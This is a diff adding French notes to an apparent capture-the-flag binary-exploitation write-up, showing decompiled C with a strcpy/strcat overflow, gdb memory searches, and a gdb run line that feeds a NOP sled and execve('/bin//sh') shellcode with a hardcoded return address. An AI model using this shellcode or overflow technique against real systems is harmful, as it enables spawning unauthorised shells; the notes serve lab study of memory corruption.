@@ -95,3 +95,66 @@ not found car %esp est mov dans %ebp donc le find ne trouve pas a partir de %esp
 
 On a notre adresse a modifier et sa position dans la stack ! MAGNIFIKE MA CHERIE
 
+
+r < <(python -c 'print "A"*40'; python -c 'print "\x90" * 9 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x4c\xf6\xff\xbf"')
+
+
+```c
+char* pp(char* arg1) {
+    char buffer1[48];  // [ebp-0x30]
+    char buffer2[28];  // [ebp-0x1c]
+    
+    p(buffer1, data_80486a0);  // Premier input: AAAAA...
+    p(buffer2, data_80486a0);  // Deuxième input: BBBBB...
+    
+    strcpy(arg1, buffer1);     // Copie AAAAA dans arg1
+    
+    size_t len = strlen(arg1); // Trouve la longueur de arg1
+    arg1[len] = ' ';          // Ajoute un espace
+    
+    strcat(arg1, buffer2);     // Ajoute BBBBB à la suite
+}
+```
+
+`arg1` est en fait le `str` déclaré dans le `main()`. C'est là qu'est la vulnérabilité:
+
+1. `buffer1` contient 20 'A' (sans null byte)
+2. `buffer2` contient 20 'B' (sans null byte)
+3. Quand on copie `buffer1` dans `str`, on a 20 'A'
+4. On ajoute un espace
+5. Quand `strcat` ajoute `buffer2`, il va écrire les 20 'B' à la suite
+
+Donc dans `str`, on va avoir:
+```
+AAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBB
+```
+
+C'est 41 caractères dans un buffer de 42, mais comme il n'y a pas de null byte entre les A et les B, on peut déborder et écraser la mémoire au-delà de `str`.
+
+La vulnérabilité est donc dans le fait qu'on peut écrire plus que la taille prévue de `str` grâce à l'absence de null bytes dans les `strncpy` précédents.
+
+
+--> En realite le buffer est ecrit en memoire, seulent 20 bytes sont copier dans le strncpy mais on s'en fou frerot
+
+r < <(python -c 'print "A"*20'; python -c 'print "B"*20')
+
+
+(gdb) find $esp, +1000, 0x41414141
+0xbffff706
+0xbffff707
+0xbffff708
+0xbffff709
+0xbffff70a
+0xbffff70b
+0xbffff70c
+0xbffff70d
+0xbffff70e
+0xbffff70f
+0xbffff710
+0xbffff711
+0xbffff712
+0xbffff713
+0xbffff714
+0xbffff715
+0xbffff716
+17 patterns found.
